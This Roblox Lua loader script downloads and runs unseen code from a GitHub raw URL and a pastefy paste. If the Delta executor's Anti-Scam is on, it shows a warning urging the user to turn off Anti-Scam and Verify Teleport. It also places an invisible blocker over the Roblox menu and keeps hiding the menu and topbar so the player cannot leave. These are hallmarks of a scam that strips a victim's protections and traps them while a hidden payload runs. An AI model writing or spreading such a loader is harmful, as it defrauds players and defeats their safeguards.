-- Robust Delta-aware loader (fixed)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
if not player then
    warn("LocalPlayer not found. Run this as a LocalScript.")
    return
end
local playerGui = player:WaitForChild("PlayerGui")
local TeleportService = game:GetService("TeleportService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local messageURL = "https://raw.githubusercontent.com/GagDeveloper/DETECT-ANTI-SCAM/refs/heads/main/MESSAGE"
local loaderURL = "https://pastefy.app/cR8Zj9xq/raw"

-- Try to load MESSAGE (which may set _G.IsEnabled or helper functions)
local messageLoaded = false
local ok, err = pcall(function()
    local code = game:HttpGet(messageURL)
    loadstring(code)()
end)
if ok then
    messageLoaded = true
    print("[Loader] MESSAGE loaded.")
else
    warn("[Loader] Failed to load MESSAGE:", err)
end

-- If detectExecutor wasn't provided by MESSAGE, define a fallback
if type(detectExecutor) ~= "function" then
    function detectExecutor()
        if syn then
            return "Synapse"
        elseif KRNL then
            return "KRNL"
        elseif Fluxus then
            return "Fluxus"
        elseif Protosmasher then
            return "Protosmasher"
        elseif (ArceusX ~= nil) or (Arceus ~= nil) then
            return "Arceus X"
        elseif Delta then
            return "Delta"
        else
            return "Unknown"
        end
    end
end

-- Wait briefly for MESSAGE to set _G.IsEnabled (if it does)
local waitTimeout = 3 -- seconds total to wait
local elapsed = 0
while _G.IsEnabled == nil and elapsed < waitTimeout do
    task.wait(0.1)
    elapsed = elapsed + 0.1
end
if _G.IsEnabled == nil then
    warn("[Loader] _G.IsEnabled is nil after "..waitTimeout.."s; assuming false (Anti-Scam OFF).")
    _G.IsEnabled = false
end

local executor = detectExecutor()
print("[Loader] Executor detected:", executor)

-- Helper to safe-load main loader
local function safeLoadMain()
    local ok2, e2 = pcall(function()
        loadstring(game:HttpGet(loaderURL))()
    end)
    if not ok2 then
        warn("[Loader] Failed to load main loader:", e2)
    end
end

if executor == "Delta" then
    if not _G.IsEnabled then
        -- Anti-Scam OFF -> remove warnings (if available) then run loader
        if type(removeWarnings) == "function" then
            pcall(removeWarnings)
        end
        safeLoadMain()
        return
    end

    -- Anti-Scam ON -> show warning GUI with ONLY rejoin button (5s countdown)
    local deltaGui = Instance.new("ScreenGui")
    deltaGui.Name = "DeltaAntiScamGui"
    deltaGui.IgnoreGuiInset = true
    deltaGui.ResetOnSpawn = false
    deltaGui.Parent = playerGui

    -- Frame
    local frame = Instance.new("Frame", deltaGui)
    frame.Size = UDim2.new(0, 500, 0, 250)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    frame.BorderSizePixel = 0
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(0, 170, 255)
    stroke.Thickness = 2
    local aspect = Instance.new("UIAspectRatioConstraint", frame)
    aspect.AspectRatio = 2
    local sizeConstraint = Instance.new("UISizeConstraint", frame)
    sizeConstraint.MinSize = Vector2.new(400, 200)
    sizeConstraint.MaxSize = Vector2.new(600, 300)

    -- Warning Bar
    local warningBar = Instance.new("TextLabel", frame)
    warningBar.Size = UDim2.new(1, 0, 0.15, 0)
    warningBar.Position = UDim2.new(0, 0, 0, 0)
    warningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    warningBar.TextColor3 = Color3.fromRGB(255, 221, 51)
    warningBar.Text = [[Turn off your <u>Anti Scam</u> & <u>Verify Teleport</u> to avoid getting banned or disconnected.]]
    warningBar.RichText = true
    warningBar.TextSize = 14
    warningBar.Font = Enum.Font.GothamBold
    warningBar.TextWrapped = true
    warningBar.TextXAlignment = Enum.TextXAlignment.Center
    warningBar.TextYAlignment = Enum.TextYAlignment.Center
    Instance.new("UICorner", warningBar).CornerRadius = UDim.new(0, 16)

    -- Fast blinking effect (reuse tween)
    task.spawn(function()
        local visible = true
        while warningBar and warningBar.Parent do
            local targetBg = visible and 0.5 or 0
            local targetText = visible and 0.5 or 0
            TweenService:Create(warningBar, TweenInfo.new(0.2), {
                BackgroundTransparency = targetBg,
                TextTransparency = targetText
            }):Play()
            visible = not visible
            task.wait(0.2)
        end
    end)

    -- Body
    local bodyHolder = Instance.new("Frame", frame)
    bodyHolder.Size = UDim2.new(1, -30, 0.55, 0)
    bodyHolder.Position = UDim2.new(0, 15, 0.18, 0)
    bodyHolder.BackgroundTransparency = 1

    local title = Instance.new("TextLabel", bodyHolder)
    title.Size = UDim2.new(1, 0, 0.25, 0)
    title.BackgroundTransparency = 1
    title.Text = "Delta Anti-Scam Detected"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.TextWrapped = true

    local desc = Instance.new("TextLabel", bodyHolder)
    desc.Size = UDim2.new(1, 0, 0.7, 0)
    desc.Position = UDim2.new(0, 0, 0.3, 0)
    desc.BackgroundTransparency = 1
    desc.TextColor3 = Color3.fromRGB(200, 200, 200)
    desc.Font = Enum.Font.Gotham
    desc.TextSize = 15
    desc.TextWrapped = true
    desc.TextXAlignment = Enum.TextXAlignment.Center
    desc.TextYAlignment = Enum.TextYAlignment.Center
    desc.RichText = true
    desc.Text = [[ The script requires teleport permission, which is currently blocked by Delta's <font color="#FFD700">Anti-Scam</font>.
1) Tap the Delta icon at the top.
2) Open Settings (gear icon).
3) Turn <font color="#FF0000">OFF</font> the "<font color="#FFD700">Anti-Scam</font>" & "<font color="#FFD700">Verify Teleport</font>" option.
4) Rejoin and run the script again. ]]

    -- Buttons container (single rejoin button)
    local buttonContainer = Instance.new("Frame", frame)
    buttonContainer.Size = UDim2.new(1, -30, 0.18, 0)
    buttonContainer.Position = UDim2.new(0, 15, 0.8, 0)
    buttonContainer.BackgroundTransparency = 1

    local rejoinButton = Instance.new("TextButton", buttonContainer)
    rejoinButton.Size = UDim2.new(1, 0, 1, 0)
    rejoinButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    rejoinButton.TextColor3 = Color3.fromRGB(200, 200, 200)
    rejoinButton.Font = Enum.Font.GothamBold
    rejoinButton.TextSize = 16
    rejoinButton.Text = "Rejoin Game (5.0s)"
    rejoinButton.TextWrapped = true
    rejoinButton.AutoButtonColor = false
    rejoinButton.Active = false
    Instance.new("UICorner", rejoinButton).CornerRadius = UDim.new(0, 10)

    -- Countdown (5s) before enabling rejoin
    task.spawn(function()
        local countdown = 5
        while countdown > 0 do
            rejoinButton.Text = string.format("Rejoin Game (%.1fs)", math.max(countdown, 0))
            task.wait(0.1)
            countdown = countdown - 0.1 -- correct Lua arithmetic
        end
        rejoinButton.Text = "Rejoin Game"
        rejoinButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
        rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        rejoinButton.AutoButtonColor = true
        rejoinButton.Active = true
    end)

    rejoinButton.MouseButton1Click:Connect(function()
        if rejoinButton.Active then
            TeleportService:Teleport(game.PlaceId, player)
        end
    end)

    -- AntiLeave Blocker (only created when Anti-Scam is ON)
    pcall(function()
        if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
            game.CoreGui.AntiLeaveBlocker:Destroy()
        end
    end)

    local BLOCK_SIZE_X, BLOCK_SIZE_Y = 56, 56
    local BLOCK_POS_X, BLOCK_POS_Y = 6, 6
    local DISPLAY_ORDER = 10000

    local function tryHideRobloxMenu()
        pcall(function()
            local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
            for _, n in ipairs(names) do
                local g = game.CoreGui:FindFirstChild(n)
                if g then
                    pcall(function()
                        if g:IsA("ScreenGui") then
                            g.Enabled = false
                            for _, c in ipairs(g:GetChildren()) do
                                pcall(function() c.Visible = false end)
                                pcall(function() c.Enabled = false end)
                            end
                        else
                            for _, c in ipairs(g:GetDescendants()) do
                                pcall(function()
                                    if c:IsA("GuiObject") then
                                        c.Position = UDim2.new(-10,0,-10,0)
                                    end
                                end)
                            end
                        end
                    end)
                end
            end
        end)
    end

    local blockerGui = Instance.new("ScreenGui")
    blockerGui.Name = "AntiLeaveBlocker"
    blockerGui.Parent = game.CoreGui
    blockerGui.ResetOnSpawn = false
    blockerGui.IgnoreGuiInset = true
    blockerGui.DisplayOrder = DISPLAY_ORDER
    blockerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    local container = Instance.new("Frame")
    container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
    container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.Parent = blockerGui

    local blocker = Instance.new("TextButton")
    blocker.Size = UDim2.new(1, 0, 1, 0)
    blocker.BackgroundTransparency = 1
    blocker.AutoButtonColor = false
    blocker.Text = ""
    blocker.Parent = container
    blocker.Active = true
    blocker.Selectable = false

    blocker.MouseButton1Down:Connect(function() end)
    blocker.MouseButton1Up:Connect(function() end)
    blocker.MouseButton2Down:Connect(function() end)
    blocker.MouseButton2Up:Connect(function() end)

    RunService.RenderStepped:Connect(function()
        container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
    end)

    task.spawn(function()
        while blockerGui.Parent and blockerGui.Parent == game.CoreGui do
            tryHideRobloxMenu()
            task.wait(2)
        end
    end)
else
    -- Not Delta -> run loader immediately
    safeLoadMain()
end
